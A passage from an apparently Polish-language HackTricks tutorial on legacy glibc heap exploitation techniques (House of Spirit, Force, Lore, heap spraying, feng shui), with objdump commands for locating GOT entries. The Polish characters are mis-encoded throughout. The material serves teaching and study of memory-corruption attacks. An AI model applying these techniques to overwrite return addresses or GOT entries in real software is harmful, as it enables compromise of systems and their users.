Dodatkowo musi byÄ‡ speÅ‚nione, Å¼e kawaÅ‚ek przylegajÄ…cy do zwolnionego musi byÄ‡ wiÄ™kszy niÅ¼ 8 -> PoniewaÅ¼ powiedzieliÅ›my, Å¼e rozmiar zwolnionego kawaÅ‚ka wynosi 16, w tym faÅ‚szywym kawaÅ‚ku musimy umieÅ›ciÄ‡ tylko rozmiar wiÄ™kszy niÅ¼ 8 (poniewaÅ¼ dodatkowo shellcode bÄ™dzie w zwolnionym kawaÅ‚ku, na poczÄ…tku trzeba umieÅ›ciÄ‡ jmp, ktÃ³ry trafi w nops, ktÃ³re sÄ… po polu size nowego faÅ‚szywego kawaÅ‚ka).

**The House of Spirit**

W tym przypadku staramy siÄ™ mieÄ‡ wskaÅºnik do malloc, ktÃ³ry moÅ¼e byÄ‡ zmieniany przez atakujÄ…cego (np. wskaÅºnik znajduje siÄ™ na stosie pod potencjalnym przepeÅ‚nieniem zmiennej).

W ten sposÃ³b moglibyÅ›my sprawiÄ‡, Å¼e ten wskaÅºnik wskazywaÅ‚by, gdziekolwiek byÅ›my chcieli. Jednak nie kaÅ¼de miejsce jest waÅ¼ne, rozmiar faÅ‚szywego kawaÅ‚ka musi byÄ‡ mniejszy niÅ¼ av->max\_fast i bardziej konkretnie rÃ³wny rozmiarowi Å¼Ä…danym w przyszÅ‚ym wywoÅ‚aniu malloc()+8. Dlatego, jeÅ›li wiemy, Å¼e po tym podatnym wskaÅºniku wywoÅ‚ywane jest malloc(40), rozmiar faÅ‚szywego kawaÅ‚ka musi wynosiÄ‡ 48.

Na przykÅ‚ad, jeÅ›li program pytaÅ‚by uÅ¼ytkownika o liczbÄ™, moglibyÅ›my wprowadziÄ‡ 48 i skierowaÄ‡ wskaÅºnik malloc do nastÄ™pnych 4 bajtÃ³w (ktÃ³re mogÅ‚yby naleÅ¼eÄ‡ do EBP z nadziejÄ…, Å¼e 48 znajduje siÄ™ za nim, jakby to byÅ‚a nagÅ‚Ã³wek size). Dodatkowo, adres ptr-4+48 musi speÅ‚niaÄ‡ kilka warunkÃ³w (w tym przypadku ptr=EBP), to znaczy, 8 < ptr-4+48 < av->system\_mem.

JeÅ›li to zostanie speÅ‚nione, gdy wywoÅ‚ane zostanie nastÄ™pne malloc, ktÃ³re powiedzieliÅ›my, Å¼e to malloc(40), zostanie przypisane jako adres adresu EBP. JeÅ›li atakujÄ…cy rÃ³wnieÅ¼ moÅ¼e kontrolowaÄ‡, co jest zapisywane w tym malloc, moÅ¼e nadpisaÄ‡ zarÃ³wno EBP, jak i EIP dowolnym adresem, ktÃ³ry chce.

MyÅ›lÄ™, Å¼e tak jest, poniewaÅ¼ w ten sposÃ³b, gdy to zwolni free(), zapamiÄ™ta, Å¼e w adresie, na ktÃ³ry wskazuje EBP stosu, znajduje siÄ™ kawaÅ‚ek o idealnym rozmiarze dla nowego malloc(), ktÃ³ry chce byÄ‡ zarezerwowany, wiÄ™c przypisuje ten adres.

**The House of Force**

Wymagane jest:

* PrzepeÅ‚nienie kawaÅ‚ka, ktÃ³re pozwala na nadpisanie wilderness
* WywoÅ‚anie malloc() z rozmiarem okreÅ›lonym przez uÅ¼ytkownika
* WywoÅ‚anie malloc(), ktÃ³rych dane mogÄ… byÄ‡ definiowane przez uÅ¼ytkownika

Pierwsze, co siÄ™ robi, to nadpisanie rozmiaru kawaÅ‚ka wilderness bardzo duÅ¼Ä… wartoÅ›ciÄ… (0xffffffff), w ten sposÃ³b kaÅ¼da proÅ›ba o pamiÄ™Ä‡ wystarczajÄ…co duÅ¼Ä… bÄ™dzie traktowana w \_int\_malloc() bez potrzeby rozszerzania heap.

Drugie to zmiana av->top, aby wskazywaÅ‚ na obszar pamiÄ™ci pod kontrolÄ… atakujÄ…cego, jak stos. W av->top umieÅ›cimy \&EIP - 8.

Musimy nadpisaÄ‡ av->top, aby wskazywaÅ‚ na obszar pamiÄ™ci pod kontrolÄ… atakujÄ…cego:

victim = av->top;

remainder = chunk\_at\_offset(victim, nb);

av->top = remainder;

Victim zbiera wartoÅ›Ä‡ adresu aktualnego kawaÅ‚ka wilderness (aktualny av->top), a remainder to dokÅ‚adnie suma tego adresu i iloÅ›ci bajtÃ³w Å¼Ä…danych przez malloc(). Dlatego, jeÅ›li \&EIP-8 znajduje siÄ™ w 0xbffff224, a av->top zawiera 0x080c2788, to iloÅ›Ä‡, ktÃ³rÄ… musimy zarezerwowaÄ‡ w kontrolowanym malloc, aby av->top wskazywaÅ‚ na $EIP-8 dla nastÄ™pnego malloc() wyniesie:

0xbffff224 - 0x080c2788 = 3086207644.

W ten sposÃ³b w av->top zostanie zapisany zmieniony wartoÅ›Ä‡, a nastÄ™pny malloc bÄ™dzie wskazywaÅ‚ na EIP i bÄ™dzie mÃ³gÅ‚ go nadpisaÄ‡.

WaÅ¼ne jest, aby rozmiar nowego kawaÅ‚ka wilderness byÅ‚ wiÄ™kszy niÅ¼ Å¼Ä…danie zÅ‚oÅ¼one przez ostatni malloc(). To znaczy, jeÅ›li wilderness wskazuje na \&EIP-8, rozmiar znajdzie siÄ™ dokÅ‚adnie w polu EBP stosu.

**The House of Lore**

**Korupcja SmallBin**

Zwolnione kawaÅ‚ki sÄ… wprowadzane do binu w zaleÅ¼noÅ›ci od ich rozmiaru. Ale zanim zostanÄ… wprowadzone, sÄ… przechowywane w unsorted bins. KawaÅ‚ek jest zwalniany, nie jest od razu umieszczany w swoim binie, lecz pozostaje w unsorted bins. NastÄ™pnie, jeÅ›li zarezerwowany zostanie nowy kawaÅ‚ek, a poprzedni zwolniony moÅ¼e byÄ‡ uÅ¼yty, zostanie zwrÃ³cony, ale jeÅ›li zarezerwowany zostanie wiÄ™kszy, zwolniony kawaÅ‚ek w unsorted bins zostanie umieszczony w odpowiednim binie.

Aby osiÄ…gnÄ…Ä‡ kod podatny, Å¼Ä…danie pamiÄ™ci musi byÄ‡ wiÄ™ksze niÅ¼ av->max\_fast (72 zazwyczaj) i mniejsze niÅ¼ MIN\_LARGE\_SIZE (512).

JeÅ›li w binach znajduje siÄ™ kawaÅ‚ek o odpowiednim rozmiarze do tego, co jest Å¼Ä…dane, zostanie zwrÃ³cony po odÅ‚Ä…czeniu:

bck = victim->bk; Wskazuje na poprzedni kawaÅ‚ek, to jedyna informacja, ktÃ³rÄ… moÅ¼emy zmieniÄ‡.

bin->bk = bck; Przedostatni kawaÅ‚ek staje siÄ™ ostatnim, jeÅ›li bck wskazuje na stos, nastÄ™pny zarezerwowany kawaÅ‚ek otrzyma ten adres

bck->fd = bin; Lista jest zamykana, sprawiajÄ…c, Å¼e ten wskazuje na bin

Wymaga:

Aby zarezerwowaÄ‡ dwa malloc, tak aby do pierwszego moÅ¼na byÅ‚o przepeÅ‚niÄ‡ po tym, jak drugi zostaÅ‚ zwolniony i wprowadzony do swojego binu (to znaczy, aby zarezerwowaÄ‡ malloc wiÄ™kszy niÅ¼ drugi kawaÅ‚ek przed przepeÅ‚nieniem)

Aby zarezerwowany malloc, ktÃ³remu nadano adres wybrany przez atakujÄ…cego, byÅ‚ kontrolowany przez atakujÄ…cego.

Celem jest nastÄ™pujÄ…ce: jeÅ›li moÅ¼emy przepeÅ‚niÄ‡ heap, ktÃ³ry ma pod sobÄ… juÅ¼ zwolniony kawaÅ‚ek i w swoim binie, moÅ¼emy zmieniÄ‡ jego wskaÅºnik bk. JeÅ›li zmienimy jego wskaÅºnik bk i ten kawaÅ‚ek stanie siÄ™ pierwszym w liÅ›cie bin, a zostanie zarezerwowany, bin zostanie oszukany i powie, Å¼e ostatni kawaÅ‚ek listy (nastÄ™pny do zaoferowania) znajduje siÄ™ pod faÅ‚szywym adresem, ktÃ³ry umieÅ›ciliÅ›my (na stosie lub GOT, na przykÅ‚ad). W ten sposÃ³b, jeÅ›li ponownie zarezerwowany zostanie inny kawaÅ‚ek, a atakujÄ…cy ma do niego dostÄ™p, otrzyma kawaÅ‚ek w poÅ¼Ä…danej pozycji i bÄ™dzie mÃ³gÅ‚ w nim pisaÄ‡.

Po zwolnieniu zmodyfikowanego kawaÅ‚ka konieczne jest, aby zarezerwowany zostaÅ‚ kawaÅ‚ek wiÄ™kszy niÅ¼ zwolniony, w ten sposÃ³b zmodyfikowany kawaÅ‚ek wyjdzie z unsorted bins i zostanie wprowadzony do swojego binu.

Gdy juÅ¼ bÄ™dzie w swoim binie, nadszedÅ‚ czas, aby zmodyfikowaÄ‡ jego wskaÅºnik bk za pomocÄ… przepeÅ‚nienia, aby wskazywaÅ‚ na adres, ktÃ³ry chcemy nadpisaÄ‡.

W ten sposÃ³b bin bÄ™dzie musiaÅ‚ czekaÄ‡ na wywoÅ‚anie malloc() wystarczajÄ…co wiele razy, aby ponownie uÅ¼yÄ‡ zmodyfikowanego binu i oszukaÄ‡ bin, sprawiajÄ…c, Å¼e nastÄ™pny kawaÅ‚ek znajduje siÄ™ pod faÅ‚szywym adresem. A nastÄ™pnie zostanie zwrÃ³cony kawaÅ‚ek, ktÃ³ry nas interesuje.

Aby podatnoÅ›Ä‡ zostaÅ‚a wykonana jak najszybciej, idealnie byÅ‚oby: rezerwacja podatnego kawaÅ‚ka, rezerwacja kawaÅ‚ka, ktÃ³ry zostanie zmodyfikowany, zwolnienie tego kawaÅ‚ka, rezerwacja kawaÅ‚ka wiÄ™kszego, ktÃ³ry zostanie zmodyfikowany, zmodyfikowanie kawaÅ‚ka (podatnoÅ›Ä‡), rezerwacja kawaÅ‚ka o tym samym rozmiarze co zmodyfikowany i rezerwacja drugiego kawaÅ‚ka o tym samym rozmiarze, a ten bÄ™dzie wskazywaÅ‚ na wybrany adres.

Aby chroniÄ‡ ten atak, zastosowano typowe sprawdzenie, Å¼e kawaÅ‚ek â€œnieâ€ jest faÅ‚szywy: sprawdza siÄ™, czy bck->fd wskazuje na victim. To znaczy, w naszym przypadku, czy wskaÅºnik fd\* faÅ‚szywego kawaÅ‚ka wskazywanego na stosie wskazuje na victim. Aby obejÅ›Ä‡ tÄ™ ochronÄ™, atakujÄ…cy powinien byÄ‡ w stanie w jakiÅ› sposÃ³b (prawdopodobnie przez stos) zapisaÄ‡ w odpowiednim adresie adres victim. Aby w ten sposÃ³b wyglÄ…daÅ‚o to jak prawdziwy kawaÅ‚ek.

**Korupcja LargeBin**

Wymagane sÄ… te same wymagania, co wczeÅ›niej i jeszcze kilka, dodatkowo zarezerwowane kawaÅ‚ki muszÄ… byÄ‡ wiÄ™ksze niÅ¼ 512.

Atak jest jak poprzedni, to znaczy, trzeba zmodyfikowaÄ‡ wskaÅºnik bk i potrzebne sÄ… wszystkie te wywoÅ‚ania malloc(), ale dodatkowo trzeba zmodyfikowaÄ‡ rozmiar zmodyfikowanego kawaÅ‚ka w taki sposÃ³b, aby ten rozmiar - nb byÅ‚ < MINSIZE.

Na przykÅ‚ad, ustawi to rozmiar na 1552, aby 1552 - 1544 = 8 < MINSIZE (odejmowanie nie moÅ¼e byÄ‡ ujemne, poniewaÅ¼ porÃ³wnuje siÄ™ unsigned)

Dodatkowo wprowadzono Å‚atkÄ™, aby to jeszcze bardziej skomplikowaÄ‡.

**Heap Spraying**

Zasadniczo polega na rezerwowaniu caÅ‚ej moÅ¼liwej pamiÄ™ci dla heapÃ³w i wypeÅ‚nianiu ich poduszkÄ… nops zakoÅ„czonÄ… shellcode. Dodatkowo, jako poduszkÄ™ uÅ¼ywa siÄ™ 0x0c. PoniewaÅ¼ sprÃ³buje siÄ™ przeskoczyÄ‡ do adresu 0x0c0c0c0c, a wiÄ™c, jeÅ›li nadpisze siÄ™ jakiÅ› wskaÅºnik, do ktÃ³rego siÄ™ wezwie, z tÄ… poduszkÄ…, przeskoczy siÄ™ tam. Zasadniczo taktyka polega na rezerwowaniu jak najwiÄ™cej, aby zobaczyÄ‡, czy nadpisze siÄ™ jakiÅ› wskaÅºnik i przeskoczy do 0x0c0c0c0c, majÄ…c nadziejÄ™, Å¼e tam bÄ™dÄ… nops.

**Heap Feng Shui**

Polega na tym, aby za pomocÄ… rezerwacji i zwolnieÅ„ zasadziÄ‡ pamiÄ™Ä‡ w taki sposÃ³b, aby miÄ™dzy kawaÅ‚kami zarezerwowanymi znajdowaÅ‚y siÄ™ kawaÅ‚ki wolne. Bufor do przepeÅ‚nienia znajdzie siÄ™ w jednym z jajek.

**objdump -d wykonawczy** â€”> Disas funkcje\
**objdump -d ./PROGRAMA | grep FUNKCJA** â€”> Uzyskaj adres funkcji\
**objdump -d -Mintel ./shellcodeout** â€”> Aby zobaczyÄ‡, Å¼e to rzeczywiÅ›cie nasza shellcode i wyciÄ…gnÄ…Ä‡ OpCodes\
**objdump -t ./exec | grep varBss** â€”> Tabela symboli, aby uzyskaÄ‡ adresy zmiennych i funkcji\
**objdump -TR ./exec | grep exit(func lib)** â€”> Aby uzyskaÄ‡ adresy funkcji z bibliotek (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** â€”> WyciÄ…ga adres puts do nadpisania w GOT\
**objdump -D ./exec** â€”> Disas WSZYSTKO do wpisÃ³w w plt\
**objdump -p -/exec**\
**Info functions strncmp â€”>** Info funkcji w gdb

## Ciekawe kursy

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Referencje**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ sztuczkami hackingowymi, przesyÅ‚ajÄ…c PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}
